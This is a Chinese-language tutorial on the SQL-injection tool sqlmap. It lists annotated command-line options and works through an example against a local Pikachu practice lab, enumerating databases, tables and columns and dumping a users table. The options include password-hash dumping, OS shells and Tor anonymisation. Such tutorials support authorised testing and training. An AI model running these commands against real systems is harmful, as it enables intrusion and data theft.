# sqlmap使用

## x100、简介

sqlmap是一款使用python编写的sql注入神器，可以极大的提高渗透的效率，掌握sqlmap的用法绝对能助渗透一臂之力

## x200、使用

#### x210.基本用法

```
sqlmap.py -u "网址"
```

sqlmap会自动检测是否存在SQL注入，并且标注注入的类型

可以使用*标注注入点

```
Options://选项
  -h, --help            Show basic help message and exit//查看帮助
  -hh                   Show advanced help message and exit//查看高级帮助
  --version             Show program's version number and exit//查看版本号
  -v VERBOSE            Verbosity level: 0-6 (default 1)//详细等级

  Target://目标
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")//指定网址
    -g GOOGLEDORK       Process Google dork results as target URLs//从谷歌中找目标
    -r xx.txt //可以根据请求包进行注入，一般配合burpsuite使用

  Request://请求
    These options can be used to specify how to connect to the target URL

    --data=DATA         Data string to be sent through POST (e.g. "id=1")//post注入
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")//cookie注入
    --random-agent      Use randomly selected HTTP User-Agent header value//使用随机agent作为http包里的user-agent//代理
    --proxy=PROXY       Use a proxy to connect to the target URL//使用代理服务器连接目标url
    --tor               Use Tor anonymity network//使用tor代理
    --check-tor         Check to see if Tor is used properly

  Injection://注入
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)//可测试参数
    --dbms=DBMS         Force back-end DBMS to provided value//强制后端DBMS为此值

  Detection://侦测
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)//设置探测等级
    --risk=RISK         Risk of tests to perform (1-3, default 1)//风险等级

  Techniques://指定注入方式
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
    U--union B--boolean E--erro 


  Enumeration://数据
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables

    -a, --all           Retrieve everything//获取所有信息
    -b, --banner        Retrieve DBMS banner//查看数据库版本
    --current-user      Retrieve DBMS current user//查看当前用户
    --current-db        Retrieve DBMS current database//查看当前数据库
    --dbs //获取所有数据库信息
    --passwords         Enumerate DBMS users password hashes//查看密码
    --tables            Enumerate DBMS database tables//查看数据库的所有表
    --columns           Enumerate DBMS database table columns//查看表所有字段
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries//将数据拖出来
    --dump-all          Dump all DBMS databases tables entries//将所有数据拖出来
    -D DB               DBMS database to enumerate//指定数据库
    -T TBL              DBMS database table(s) to enumerate//指定表
    -C COL              DBMS database table column(s) to enumerate//指定字段

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-shell          Prompt for an interactive operating system shell//获取shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC

  General:
    These options can be used to set some general working parameters

    --batch             Never ask for user input, use the default behavior//自动选择yes
    --flush-session     Flush session files for current target

  Miscellaneous:
    These options do not fit into any other category

    --wizard            Simple wizard interface for beginner users
```

实例

```
sqlmap.py -u "http://127.0.0.1/pikachu/vul/sqli/sqli_str.php?name=kkk*&submit=%E6%9F%A5%E8%AF%A2"
```

查询数据库

```
sqlmap.py -u "http://127.0.0.1/pikachu/vul/sqli/sqli_str.php?name=kkk*&submit=%E6%9F%A5%E8%AF%A2" --dbs
```

查询表

```
sqlmap.py -u "http://127.0.0.1/pikachu/vul/sqli/sqli_str.php?name=kkk*&submit=%E6%9F%A5%E8%AF%A2" -D pikachu --tables
```

查询字段

```
sqlmap.py -u "http://127.0.0.1/pikachu/vul/sqli/sqli_str.php?name=kkk*&submit=%E6%9F%A5%E8%AF%A2" -D pikachu -T users --columns
```

查询信息

```
sqlmap.py -u "http://127.0.0.1/pikachu/vul/sqli/sqli_str.php?name=kkk*&submit=%E6%9F%A5%E8%AF%A2" -D pikachu -T users --dump  //查询pikachu库下users表的所有内容
```

基本使用结果如上，另外sqlmap还有写入数据等功能，总之十分强大，此处不一一举例，详情，网络查询，例如csdn或者其他平台。
